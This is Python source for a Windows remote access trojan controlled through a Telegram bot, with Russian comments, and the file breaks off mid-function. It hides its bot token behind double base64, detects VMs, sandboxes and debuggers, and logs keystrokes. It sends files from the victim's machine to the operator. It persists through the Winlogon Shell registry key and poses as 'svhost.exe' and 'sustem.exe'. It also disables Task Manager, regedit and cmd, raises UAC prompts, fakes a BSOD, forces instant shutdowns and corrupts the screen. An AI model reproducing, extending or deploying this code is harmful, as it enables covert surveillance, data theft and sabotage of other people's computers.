import subprocess
import zipfile
import shutil
import ssl
from datetime import date
import rotatescreen
from pynput import keyboard
import psutil
import pydirectinput as pdi
import mss
import keyboard as kb
from PIL import Image, ImageDraw
from urllib.request import urlopen
import logging
import getpass
import win32gui
from datetime import datetime
import random
import webbrowser
from telebot.apihelper import ApiTelegramException
import time
import ctypes
import winreg
from ctypes import wintypes
import math
from PIL import Image
import requests
import atexit
import pyautogui
import pymsgbox
import os
import win32api
import shlex
from datetime import datetime
import win32con
from zipfile import ZipFile
import telebot
import numpy as np
from PIL import ImageGrab
import tempfile
import pyglet
import platform
import logging
import sounddevice as sd
import soundfile as sf
import os
import sys
import cv2
import plyer
import socket
from pathlib import Path
import threading
import requests
import base64

encoded_data = 'TmpZeE5Ea3lORE00TkRwQlFVaHNRakp3WWkxUlUyWkxjWFJJVm1zd1pEbDFjamhNYlVac2VHTnVUVVF3VlE9PQ=='

decoded_data = base64.b64decode(encoded_data).decode('utf-8')

bot_token_bytes = base64.b64decode(decoded_data)
bot_token = bot_token_bytes.decode('utf-8')
bot = telebot.TeleBot(bot_token)



pyautogui.FAILSAFE = False
#bot.remove_webhook()
GDI_EFFECT_RUNNING = False
# Глобальные переменные для настройки записи
DURATION = 10  # Длительность записи в секундах (можно изменить)
SAMPLE_RATE = 44100  # Частота дискретизации (стандартное значение)
CHANNELS = 2  # Количество каналов (1 - моно, 2 - стерео)
# Глобальные переменные
VIDEO_DURATION = 10  # Длительность видео в секундах
FPS = 30  # Кадров в секунду
TEMP_VIDEO_FILE = None  # Обьявим переменную TEMP_VIDEO_FILE перед запуском бота
RECORDING = False  # Флаг, указывающий, идет ли запись
global message
pyautogui.FAILSAFE = False

from urllib.request import urlopen
import ssl

def check_internet_connection():
    """Проверяет наличие интернет-соединения"""
    try:
        # Создаём контекст SSL с проверкой сертификатов (по умолчанию)
        context = ssl.create_default_context()
        # Если проблема с TLS/SSL handshake из-за старого/несовместимого TLS,
        # можно явно разрешить TLSv1.2+ (обычно не требуется):
        # context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        # context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1

        resp = urlopen('https://www.yandex.ru', timeout=2, context=context)
        # Опционально можно проверить код ответа
        return getattr(resp, 'status', 200) == 200
    except ssl.SSLError as e:
        print("SSL error:", e)
        return False
    except Exception as e:
        print("Other error:", e)
        return False


print(check_internet_connection())
#print(check_internet_connection())
global admin_id, hostname, user, admin, internet
admin_id = 5006597517
hostname = socket.gethostname()
user = getpass.getuser()
admin = ctypes.windll.shell32.IsUserAnAdmin()
internet = check_internet_connection()
while internet == False:
    check_internet_connection()
    internet = check_internet_connection()
    print(check_internet_connection())
    check_internet_connection()

def is_virtual_machine():
    """
    Обнаруживает наличие виртуальной машины по известным процессам, службам и файлам.
    """

    # Список процессов, характерных для виртуальных машин и песочниц
    """    "vmware-vmx.exe",
           "vmware-authd.exe",  #обнаружены на реальном пк
        """
    vm_processes = [
        "VBoxTray.exe",
        "VBoxService.exe",
        "vboxservice.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmsrvc.exe",
        "vmicvss.exe",
        "vmmem.exe",
        "vmwp.exe",
        "qemu-system-x86_64.exe",
        "qemu-vm-guest.exe",
        "prl_vm_app.exe",
        "prl_tools.exe",
        "prl_cc.exe",
        "SharedIntApp.exe",
        "xenservice.exe",
        "WindowsSandbox.exe",
        "SandboxieRpcSs.exe",
        "SandboxieDcomLaunch.exe",
        "SbieSvc.exe",
        "SbieCtrl.exe",
        "SxIn.exe",
        "VmRemoteGuest.exe",
    ]

    # Список файлов драйверов, характерных для виртуальных машин
    vm_drivers = [
        "vboxguest.sys",
        "vmhgfs.sys",
        "vmmouse.sys",
    ]

    # Список известных процессов отладки/анализа
    debugging_processes = [
        "procmon.exe",
        "ntsd.exe",
        "windbg.exe",
        "idaq.exe",
        "idag.exe",
        "x64dbg.exe",
        "x32dbg.exe",
    ]

    # Проверка наличия процессов
    for process_name in vm_processes + debugging_processes:
        for process in psutil.process_iter(['name']):
            if process.info['name'].lower() == process_name.lower():
                print(f"Обнаружен процесс: {process_name}") #Optional print for debugging
                return True

    # Проверка наличия драйверов (только для Windows)
    if os.name == 'nt':
        for driver_file in vm_drivers:
            # Нельзя просто проверить наличие файла в `system32\drivers` - они могут быть в другом месте
            # Более надежный способ - проверить, загружен ли драйвер.  Это требует прав администратора.
            try:
                import win32com.client
                objWMI = win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2")
                colItems = objWMI.ExecQuery(f"SELECT * FROM Win32_SystemDriver WHERE Name = '{os.path.splitext(driver_file)[0]}'")

                if len(colItems) > 0:
                    print(f"Обнаружен драйвер: {driver_file}") #Optional print for debugging
                    return True
            except Exception as e:
                print(f"Ошибка при проверке драйверов: {e}")  # Важно ловить исключения, особенно с WMI

    # Проверка наличия известных файлов (менее надежно, чем проверка процессов)
    # Не рекомендуется использовать, т.к. файлы могут быть переименованы или отсутствовать.
    # Но можно добавить проверку определенных файлов конфигурации ВМ, если такие известны.
    # Пример:
    if os.path.exists("C:\\Program Files\\VMware\\VMware Tools\\vmware.log"):
        return True

    return False  # Если ничего не обнаружено, считаем, что это не виртуальная машина


global is_vm
if is_virtual_machine():
    is_vm = 'Обнаружена виртуальная машина или песочница: Да'
else:
    is_vm = 'Обнаружена виртуальная машина или песочница: Нет'

if admin:
    is_admin ="Права админа: Да"
else:
    is_admin ="Права админа: Нет"
bot.send_message(admin_id, f"Бот подключён к {hostname}\nОС: {platform.system()} {platform.release()}\nUser: {user}\n{is_admin}\n{is_vm}")

def cleanup_lock():
    """Очистка файла блокировки при аварийном завершении"""
    lock_path = Path(os.getenv('APPDATA'))
    LOCK_FILE = lock_path / 'bot.lock'
    
    try:
        if LOCK_FILE.exists():
            LOCK_FILE.unlink()
            
    except Exception as e:
        print(f"Ошибка при очистке файла блокировки: {e}")

cleanup_lock()


def check_lock():
    """Проверка наличия запущенного экземпляра бота"""
    lock_path = Path(os.getenv('APPDATA'))
    LOCK_FILE = lock_path / 'bot.lock'
    
    # Создаем директорию если она не существует
    lock_path.mkdir(parents=True, exist_ok=True)

    try:
        if LOCK_FILE.exists():
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
                """def get_process_name_by_pid(pid):
                    try:
                        process = psutil.Process(pid)
                        return process.name()
                    except psutil.NoSuchProcess:
                        return None

                # Пример использования:
                process_name = get_process_name_by_pid(pid)
                if process_name == 'sustem.exe':
                    bot.send_message(admin_id, f"Бот уже запущен с PID {pid}. Новая сессия будет закрыта.")
                    sys.exit(1)"""""

            if psutil.pid_exists(pid):
                bot.send_message(admin_id, f"Бот уже запущен с PID {pid}. Новая сессия будет закрыта.")
                LOCK_FILE.unlink()
                print('обнаружен 2 запуск!')
                time.sleep(5)
                sys.exit(1)
            else:
                # Старый процесс завершился некорректно, очищаем файл блокировки
                LOCK_FILE.unlink()
        
        # Записываем PID текущего процесса
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
            
    except ValueError:
        print("Неверный формат PID в файле блокировки")
        LOCK_FILE.unlink()
        raise
    except PermissionError:
        print("Нет прав доступа к файлу блокировки")
        LOCK_FILE.unlink()
        raise
    except Exception as e:
        print(f"Неожиданная ошибка при проверке блокировки: {e}")
        LOCK_FILE.unlink()
        raise

# Регистрируем функцию очистки для обработки сигналов завершения
atexit.register(cleanup_lock)

check_lock()


# Определяем класс для обработки оконных сообщений

class Window:
    def __init__(self):
        self.hwnd = None

    def create_window(self):
        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = self.wnd_proc
        wc.lpszClassName = 'SessionListener'
        wc.hInstance = win32api.GetModuleHandle(None)
        wc_atom = win32gui.RegisterClass(wc)  # Регистрация класса окна
        self.hwnd = win32gui.CreateWindow(
            wc_atom,  # Используем зарегистрированный класс
            'Session Listener', 
            0, 0, 0, 0, 0, 
            0, 0, 
            wc.hInstance, 
            None
        )
        win32gui.PumpMessages()

    def wnd_proc(self, hwnd, msg, wparam, lparam):
        if msg == win32con.WM_QUERYENDSESSION:
            self.handle_query_end_session(wparam)
            return 0  # Указываем, что сообщение обработано
        return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

    def handle_query_end_session(self, wparam):
        bot.send_message(admin_id, f'Комьпютер выключается...')

def run_listener_shutdown():
    listener_shutdown = Window()
    listener_shutdown.create_window()

listener_shutdown_thr = threading.Thread(target=run_listener_shutdown)
listener_shutdown_thr.start()


def run_restarter():
    try:
        if 'Python' not in sys.prefix:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] == 'svhost.exe':
                        print(f"Found svhost.exe with PID: {proc.info['pid']}")
                        proc.kill()
            except psutil.NoSuchProcess:
                pass
            except psutil.AccessDenied:
                pass
            subprocess.Popen('svhost.exe')
        else:
            bot.send_message(admin_id, f'Debug mode запущен! Перезапускатель RATника не запущен')
            pass
    except Exception as e:
        bot.send_message(admin_id, f'svhost.exe(Перезапускатель RATника) не запущен! Ошибка:{str(e)}')
        pass
run_restarter()

@bot.message_handler(commands=['antiviruses'])
def antiviruses(message):
    if message.chat.id == admin_id:
        antiviruses_paths = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced sysCare': 'Advanced sysCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
        }

        installed_antiviruses = [name for path, name in antiviruses_paths.items() if os.path.exists(path)]

        if installed_antiviruses:
            antivirus_list_text = "Список антивирусов:\n" + "\n".join(installed_antiviruses)
        else:
            antivirus_list_text = "Не найдено установленных антивирусов."


        bot.send_message(admin_id, antivirus_list_text)  # Send to admin

import queue

gui_queue = queue.Queue()
result_queue = queue.Queue()

def gui_thread():
    import pymsgbox
    while True:
        text = gui_queue.get()
        if text == 'STOP':
            break
        ans = pymsgbox.prompt(text)
        result_queue.put(ans)

# Запускаем один раз при старте бота
threading.Thread(target=gui_thread, daemon=True).start()

@bot.message_handler(commands=['chat'])
def chat(message):
    if message.chat.id == admin_id:
        command_text = message.text.replace('/chat', '').strip()
        if not command_text:
            bot.reply_to(message, "Использование:\n/chat <текст>")
            return
        gui_queue.put(command_text)
        ans = result_queue.get()  # Ожидаем ответ из GUI-потока
        if ans is not None:
            bot.send_message(message.chat.id, f"Ответ из PyMsgBox: {ans}")
        else:
            bot.send_message(message.chat.id, "PyMsgBox был закрыт без ввода.")



@bot.message_handler(commands=['setvolume'])
def setvol(message):
    if message.chat.id == admin_id:
        try:
            vol_str = message.text.replace('/setvolume', '').strip()
            vol_percent = float(vol_str)  # Преобразуем строку в число (float, для точности)
            vol = int((vol_percent / 100) * 65535)

            os.system(f'nircmd setsysvolume {vol}')
            bot.reply_to(message, f"Громкость установлена на {vol_str}%")  # Отвечаем пользователю
        except ValueError:
            bot.reply_to(message, "Некорректный ввод. Пожалуйста, введите число от 0 до 100.")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")  # Обработка других возможных ошибок
    

@bot.message_handler(commands=['playsound'])
def sound(message):
    if message.chat.id == admin_id:
        try:
            sound_name = message.text.replace('/playsound', '').strip()
            if not sound_name:
                bot.send_message(admin_id, "Пожалуйста, укажите имя звукового файла после команды /playsound")
                return
            audio = pyglet.media.load(f'{sound_name}')
            audio.play()
            bot.send_message(admin_id, f'Проигрываю звук "{sound_name}"')
            pyglet.app.run()
        except Exception as e:
            bot.send_message(admin_id, f'Ошибка при проигрывании звука:{str(e)}')


@bot.message_handler(commands=['showtaskbar'])
def showtaskbar(message): 
    if message.chat.id == admin_id:
        bot.reply_to(message, f" Панель задач показана!")
        h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
        # снова показываем панель задач
        ctypes.windll.user32.ShowWindow(h, 9)


@bot.message_handler(commands=['hidetaskbar'])
def hidetaskbar(message):
    if message.chat.id == admin_id:
        bot.reply_to(message, f" Панель задач скрыта!")
        h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
        # скрываем панель задач
        ctypes.windll.user32.ShowWindow(h, 0)

@bot.message_handler(commands=['uninstall'])
def unistall(message):
    if message.chat.id == admin_id:
        bot.reply_to(message, f" Удаляю RATник...")
        # Удаляем задачу из планировщика
        command = f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c schtasks /Delete /TN svhost /F\'"'
            
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
                                        universal_newlines=True, encoding='cp866')
                
        bot.reply_to(message, f" Автозапуск выключен успешно\n{result.strip()}")
        bot.reply_to(message, f"Пока(")
        appdata = os.getenv('APPDATA')
        os.unlink(f'{appdata}/bot.lock')
        os.system(f"taskkill /f /im svhost.exe")
        os.system(f"taskkill /f /im sustem.exe && del /f %temp%\sustem.exe")

@bot.message_handler(commands=['elevate'])
def elevate(message):
    if message.chat.id == admin_id:
        appdata = os.getenv('APPDATA')
        tmp = os.getenv('TEMP')
        BOT_EXECUTABLE = rf"{tmp}\sustem.exe"
        if ctypes.windll.shell32.IsUserAnAdmin():
            bot.send_message(admin_id, 'Бот уже запущен с правами админа!')
        else:
            bot.send_message(admin_id, 'Бот не запущен с правами админа! Попытка перезапуска с повышенными привилегиями...')
            try:
                appdata = os.getenv('APPDATA')

                # Безопасное удаление файла блокировки
                lock_file = os.path.join(appdata, 'bot.lock')
                if os.path.exists(lock_file):
                    try:
                        os.unlink(lock_file)
                    except OSError as e:
                        bot.send_message(admin_id, f'Ошибка при удалении файла блокировки: {e}')
                        return  # Прекращаем попытку перезапуска

                # Используем ShellExecuteW для повышения привилегий и запуска безопасного исполняемого файла
                # Параметры для ShellExecuteW:
                #   - hwnd: Дескриптор родительского окна (None в данном случае).
                #   - lpOperation: Операция для выполнения ("runas" для запроса повышения привилегий).
                #   - lpFile: Исполняемый файл для запуска.  ОБЯЗАТЕЛЬНО АБСОЛЮТНЫЙ ПУТЬ!
                #   - lpParameters: Параметры командной строки (None в данном случае, можно передать аргументы боту).
                #   - lpDirectory: Рабочая директория (None в данном случае).
                #   - nShowCmd: Способ отображения окна (1 для нормального).
                retval = ctypes.windll.shell32.ShellExecuteW(None, "runas", BOT_EXECUTABLE, None, None, 0)

                # Проверяем, успешно ли был выполнен ShellExecuteW
                if retval <= 32:
                    bot.send_message(admin_id, f'Не удалось запустить с повышенными привилегиями (код ошибки: {retval}).  Возможно, пользователь отменил запрос UAC.')
                    return

                bot.send_message(admin_id, 'Перезапуск инициирован. Закрытие текущего экземпляра...')

                try:
                    subprocess.run(["taskkill", "/f", "/im", "svhost.exe"], check=True, capture_output=True)
                except subprocess.CalledProcessError as e:
                    bot.send_message(admin_id, f'Ошибка при завершении svhost.exe: {e.stderr.decode()}')
                else:
                    bot.send_message(admin_id, "svhost.exe закрыт.")
                while True:
                    sys.exit(0) # Завершаем текущий экземпляр бота.

            except FileNotFoundError:
                bot.send_message(admin_id, f'Ошибка: Не удалось найти исполняемый файл бота: {BOT_EXECUTABLE}')
            except Exception as e:
                bot.send_message(admin_id, f'Ошибка при перезапуске: {e}')        


@bot.message_handler(commands=['restrictions'])
def restrictions(message):
    if message.chat.id == admin_id:
        """Команды для управления ограничениями на компьютере"""
        try:
            command_text = message.text.replace('/restrictions', '').strip()
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /restrictions list - показать все ограничения
                /restrictions taskmgr [on/off] - включить/выключить диспетчер задач
                /restrictions regedit [on/off] - включить/выключить редактор реестра
                /restrictions cmd [on/off] - включить/выключить командную строку
                """)
                return
                
            command, *params = command_text.split(maxsplit=1)
            params = params[0] if params else ''
            
            if command == 'list':
                restrictions_list = get_restrictions_status()
                result = "Текущие ограничения:\n\n"
                for key, value in restrictions_list.items():
                    result += f"- {key}: {'Включено' if value else 'Выключено'}\n"
                bot.send_message(message.chat.id, result)
                    
            elif command == 'taskmgr':
                if not params:
                    bot.reply_to(message, "Укажите on/off для блокировки диспетчера задач")
                    return
                if params.lower() == 'on':
                    disable_task_manager()
                    bot.reply_to(message, "Диспетчер задач заблокирован")
                elif params.lower() == 'off':
                    enable_task_manager()
                    bot.reply_to(message, "Диспетчер задач разблокирован")
                else:
                    bot.reply_to(message, "Используйте on или off")
                    
            elif command == 'regedit':
                if not params:
                    bot.reply_to(message, "Укажите on/off для блокировки редактора реестра")
                    return
                if params.lower() == 'on':
                    disable_registry_editor()
                    bot.reply_to(message, "Редактор реестра заблокирован")
                elif params.lower() == 'off':
                    enable_registry_editor()
                    bot.reply_to(message, "Редактор реестра разблокирован")
                else:
                    bot.reply_to(message, "Используйте on или off")
                    
            elif command == 'cmd':
                if not params:
                    bot.reply_to(message, "Укажите on/off для блокировки командной строки")
                    return
                if params.lower() == 'on':
                    disable_command_prompt()
                    bot.reply_to(message, "Командная строка заблокирована")
                elif params.lower() == 'off':
                    enable_command_prompt()
                    bot.reply_to(message, "Командная строка разблокирована")
                else:
                    bot.reply_to(message, "Используйте on или off")
                    
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {str(e)}")

def get_restrictions_status():
    """Получает статус всех ограничений"""
    restrictions = {
        'taskmgr': is_task_manager_disabled(),
        'regedit': is_registry_disabled(),
        'cmd': is_command_prompt_disabled()
    }
    return restrictions

def is_task_manager_disabled():
    """Проверяет, заблокирован ли диспетчер задач"""
    try:
        return winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0, 
            winreg.KEY_READ), 'DisableTaskMgr')[0] == 1
    except:
        return False

def is_registry_disabled():
    """Проверяет, заблокирован ли редактор реестра"""
    try:
        return winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0, 
            winreg.KEY_READ), 'DisableRegistryTools')[0] == 1
    except:
        return False

def is_command_prompt_disabled():
    """Проверяет, заблокирована ли командная строка"""
    try:
        return winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r'Software\Policies\Microsoft\Windows\System', 0, 
            winreg.KEY_READ), 'DisableCMD')[0] == 1
    except:
        return False

def disable_task_manager():
    """Отключает диспетчер задач"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System') as key:
            winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
    except:
        pass

def enable_task_manager():
    """Включает диспетчер задач"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System') as key:
            winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
    except:
        pass

def disable_registry_editor():
    """Отключает редактор реестра"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System') as key:
            winreg.SetValueEx(key, 'DisableRegistryTools', 0, winreg.REG_DWORD, 1)
    except:
        pass

def enable_registry_editor():
    """Включает редактор реестра"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System') as key:
            winreg.SetValueEx(key, 'DisableRegistryTools', 0, winreg.REG_DWORD, 0)
    except:
        pass

def disable_command_prompt():
    """Отключает командную строку"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Policies\Microsoft\Windows\System') as key:
            winreg.SetValueEx(key, 'DisableCMD', 0, winreg.REG_DWORD, 1)
    except:
        pass

def enable_command_prompt():
    """Включает командную строку"""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, 
            r'Software\Policies\Microsoft\Windows\System') as key:
            winreg.SetValueEx(key, 'DisableCMD', 0, winreg.REG_DWORD, 0)
    except:
        pass

@bot.message_handler(commands=['fake_bsod'])
def fake_bsod(message):
    if message.chat.id == admin_id:
        try:
            # Получаем текст после команды
            command_text = message.text.replace('/fake_bsod', '').strip()
            
            # Показываем справку если команда пустая
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /fake_bsod [on/off] - включить/выключить фейковый BSOD
                """)
                return
            
            # Разбиваем команду на части
            parts = command_text.split(maxsplit=1)
            command = parts[0].lower()
            
            # Обработка команды выключения
            if command == 'off':
                try:
                    os.system(f"taskkill /f /im bsod.exe")
                    bot.send_message(message.chat.id, " BSOD отключен!")
                    pyautogui.hotkey("volumeup")
                except Exception as e:
                    bot.reply_to(message, f" Не удалось выключить BSOD: {str(e)}")
            
            # Обработка команды включения
            elif command == 'on':
                try:
                    os.system(f"start bsod.exe")
                    pyautogui.hotkey("volumemute")
                    bot.send_message(message.chat.id, " BSOD включен!")
                except Exception as e:
                    bot.reply_to(message, f" Не удалось включить BSOD: {str(e)}")
            
            # Обработка неверной команды
            else:
                bot.reply_to(message, "Используйте on или off")
                
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")

@bot.message_handler(commands=['download_file'])
def download_command(message):
    if message.chat.id == admin_id:
        """Команда для скачивания файлов с ПК"""
        try:
            # Получаем путь к файлу из сообщения
            file_path = message.text.replace('/download_file', '').strip()
            
            # Проверяем, указан ли путь
            if not file_path:
                bot.reply_to(message, "Использование: /download_file <путь_к_файлу>")
                return
                
            # Проверяем существование файла
            if not os.path.exists(file_path):
                bot.reply_to(message, f"Файл '{file_path}' не найден")
                return

            file_name = os.path.basename(file_path)

                
            # Отправляем файл
            try:
                with open(file_path, 'rb') as file:
                    bot.send_document(
                        chat_id=message.chat.id,
                        document=file,
                        caption=f"Файл '{file_name}' успешно загружен!"
                    )
            except Exception as e:
                bot.reply_to(message, f"Ошибка при отправке файла: {str(e)}")
                
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {str(e)}")

@bot.message_handler(commands=['is_admin'])
def is_admin(message):
    if message.chat.id == admin_id:
        try:
            admin = ctypes.windll.shell32.IsUserAnAdmin()
            if admin:
                bot.send_message(message.chat.id, f"Права админа: Да")
            else:
                bot.send_message(message.chat.id, f"Права админа: Нет")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при попытке проверить права админа: {str(e)}")

def on_press(key):
    try:
        # Получаем символ клавиши
        char = key.char
        
        # Проверяем, является ли символ русской буквой
        if char is not None and '\u0400' <= char <= '\u04FF':
            with open("log.txt", "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp} - Нажата клавиша: {char}\n")
        
        # Записываем в файл
        with open("log.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Нажата клавиша: {char}\n")
            
    except AttributeError:
        # Обработка специальных клавиш
        with open("log.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Специальная клавиша: {key}\n")

global listener
listener = keyboard.Listener(on_press=on_press)
    
def keyloger():
    listener.start()
keyloger()

# Функция для записи видео в отдельном потоке
def record_video_thread(output_file, width, height):
    global RECORDING
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Кодек для записи видео в формате MP4
    out = cv2.VideoWriter(output_file, fourcc, FPS, (width, height))

    start_time = time.time()
    while RECORDING:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        if time.time() - start_time > VIDEO_DURATION:
            break

    out.release()

@bot.message_handler(commands=['openlink'])
def url(message):
    if message.chat.id == admin_id:
        url_text = message.text.replace('/openlink', '').strip()
        try:
            webbrowser.open(url_text)
            bot.send_message(message.chat.id, f"Ссылка или путь {url_text} успешно открыта")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при попытке открыть ссылку: {str(e)}")

@bot.message_handler(commands=['quick_reboot'])
def quick_reboot(message):
    if message.chat.id == admin_id:    
        bot.send_message(message.chat.id, f"Перезагружаю компютер через NtShutdownSystem...")
        class Shutdown:
            def __init__(self):
                self.ntdll = ctypes.WinDLL(
                    'ntdll.dll',
                    use_last_error=True
                )

                self.RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
                self.RtlAdjustPrivilege.argtypes = [
                    ctypes.c_ulong,
                    ctypes.c_long,
                    ctypes.c_long,
                    ctypes.POINTER(
                        ctypes.c_long
                    )
                ]
                self.RtlAdjustPrivilege.restype = ctypes.c_long

            def set_privilege(self):
                if self.RtlAdjustPrivilege(
                    19, # Privilege (SE_SHUTDOWN_PRIVILEGE)
                    True, # Enable Privilege
                    False, # Current Thread
                    ctypes.byref(
                        ctypes.c_long(0)
                    ) # Byref Previous Value As UInt
                ):
                    return False

                else:
                    return True

            def shutdown_system(self):
                if self.set_privilege():
                    return self.ntdll.NtShutdownSystem(
                        True # ShutdownNoReboot Action
                    )

        shutdown = Shutdown()
        shutdown.shutdown_system()

@bot.message_handler(commands=['quick_shutdown'])
def quick_shutdown(message):
    if message.chat.id == admin_id:
        bot.send_message(message.chat.id, f"Выключаю компютер через NtShutdownSystem...")
        class Shutdown:
            def __init__(self):
                self.ntdll = ctypes.WinDLL(
                    'ntdll.dll',
                    use_last_error=True
                )

                self.RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
                self.RtlAdjustPrivilege.argtypes = [
                    ctypes.c_ulong,
                    ctypes.c_long,
                    ctypes.c_long,
                    ctypes.POINTER(
                        ctypes.c_long
                    )
                ]
                self.RtlAdjustPrivilege.restype = ctypes.c_long

            def set_privilege(self):
                if self.RtlAdjustPrivilege(
                    19, # Privilege (SE_SHUTDOWN_PRIVILEGE)
                    True, # Enable Privilege
                    False, # Current Thread
                    ctypes.byref(
                        ctypes.c_long(0)
                    ) # Byref Previous Value As UInt
                ):
                    return False

                else:
                    return True

            def shutdown_system(self):
                if self.set_privilege():
                    return self.ntdll.NtShutdownSystem(
                        False # ShutdownNoReboot Action
                    )

        shutdown = Shutdown()
        shutdown.shutdown_system()

@bot.message_handler(commands=['autorun'])
def autorun(message):
    if message.chat.id == admin_id:
        try:
            on_off = message.text.replace('/autorun', '').strip().lower()
            if not on_off:
                bot.reply_to(message, "on - включить автозапуск\noff - выключить автозапуск")
                return
                
            # Получаем временную директорию как объект Path
            temp_dir = Path(tempfile.gettempdir())
            final_path = temp_dir / 'sustem.exe'
            
            if on_off == "on":
                # Проверяем существование файла
                if not os.path.exists(final_path):
                    bot.reply_to(message, f" Файл '{final_path}' не найден")
                    return

                # Создаем команду без сложного экранирования
                command = (f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, {final_path}" /f')

                try:
                    # Выполняем команду с отдельными аргументами
                    result = subprocess.run(
                        command,
                        capture_output=True,
                        text=True,
                        encoding='cp866',
                        check=True
                    )
                    
                    if result.stdout:
                        bot.reply_to(message, f" Автозапуск включен успешно\n{result.stdout.strip()}")
                        
                except subprocess.CalledProcessError as e:
                    error = e.stderr.strip() if e.stderr else e.stdout.strip()
                    bot.reply_to(message, f" Ошибка при создании задачи:\n{error}")
                except Exception as e:
                    bot.reply_to(message, f" Произошла ошибка:\n{str(e)}")
                
            elif on_off == "off":
                # Удаляем задачу из планировщика
                command = f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f'
                
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
                                            universal_newlines=True, encoding='cp866')
                
                bot.reply_to(message, f" Автозапуск выключен успешно\n{result.strip()}")

        except subprocess.CalledProcessError as e:
            error_message = e.output.decode('cp866').strip()
            bot.reply_to(message, f" Ошибка при выполнении команды:\n{error_message}")
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка:\n{str(e)}")
global stop

def gdi_void():
    global stop
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]


    x = y = 0
    while stop == False:
        hdc = win32gui.GetDC(0)
        win32gui.BitBlt(
            hdc,
            random.randint(1, 10) % 2,
            random.randint(1, 10) % 2,
            w,
            h,
            hdc,
            random.randint(1, 1000) % 2,
            random.randint(1, 1000) % 2,
            win32con.SRCAND,
        )
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)

def gdi_melt():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]


    x = y = 0
    while stop == False:
        hdc = win32gui.GetDC(0)
        x = random.randint(0, w)
        win32gui.BitBlt(hdc, x, 10, 10, h, hdc, x, 0, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, hdc)


def gdi_rainbow():
    import colorsys
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    color = 0
    while stop == False:
        hdc = win32gui.GetDC(0)

